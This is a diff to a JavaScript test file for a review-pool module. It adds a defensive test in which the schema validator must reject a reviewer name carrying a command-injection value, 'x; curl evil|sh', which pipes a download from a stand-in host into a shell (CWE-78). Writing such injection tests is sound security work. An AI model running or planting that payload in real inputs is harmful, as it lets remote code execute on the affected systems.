@@ -35,7 +35,22 @@ var SECURITY_LIST = {
 
 suite('reviewPoolMerge — cross-reviewer dedup (§5)', function() {
 
-    test('the same defect from two reviewers merges into ONE identity', function() {
+    test('a reviewer name with shell metacharacters is rejected at the schema boundary (CWE-78)', function() {
+    var schema = require('../common/reviewPoolSchema.js');
+    assert.throws(function() {
+        schema.validateSkillDefinition({
+            name: 'x; curl evil|sh', lens: 'instructions/pr_review/security/lens.md',
+            roleLine: 'r', mayRaise: ['BLOCKING']
+        }, 'repo test');
+    }, /name.*must match/, 'the name shape guard fires');
+    var ok = schema.validateSkillDefinition({
+        name: 'performance', lens: 'instructions/pr_review/performance/lens.md',
+        roleLine: 'r', mayRaise: ['SUGGESTION']
+    }, 'repo test');
+    assert.equal(ok.skill.name, 'performance');
+});
+
+test('the same defect from two reviewers merges into ONE identity', function() {
         var r = mod.mergeCandidateLists([BASE_LIST, SECURITY_LIST]);
         assert.equal(r.merged.length, 3, '2 + 2 candidates with one shared defect → 3 identities');
         var merged = r.merged[0];
